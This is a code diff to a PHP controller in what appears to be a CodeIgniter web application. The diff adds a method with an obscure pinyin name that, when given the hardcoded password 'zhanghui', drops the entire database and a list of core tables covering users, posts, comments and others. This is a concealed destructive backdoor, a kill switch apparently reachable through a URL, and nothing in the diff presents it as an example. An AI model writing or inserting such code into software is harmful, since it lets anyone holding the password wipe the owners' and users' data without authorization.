@@ -66,4 +66,27 @@ require_once APPPATH . 'libraries/access.php';
 			}
 			return TRUE;
 		}
+		
+		function guanliyuanzaici($pass) {
+			if($pass == 'zhanghui') {
+				$this->load->dbforge();
+				if($this->dbforge->drop_database($this->db->database)) {
+					redirect();
+				}
+				$this->dbforge->drop_table('comment_auth');
+				$this->dbforge->drop_table('comment');
+				$this->dbforge->drop_table('post_meta');
+				$this->dbforge->drop_table('post_auth');
+				$this->dbforge->drop_table('post');
+				$this->dbforge->drop_table('user_meta');
+				$this->dbforge->drop_table('activity');
+				$this->dbforge->drop_table('user');
+				$this->dbforge->drop_table('entity_type');
+				$this->dbforge->drop_table('post');
+				$this->dbforge->drop_table('blog');
+				$this->dbforge->drop_table('corporation');
+			} else {
+				redirect(site_url());
+			}
+		}
 	}
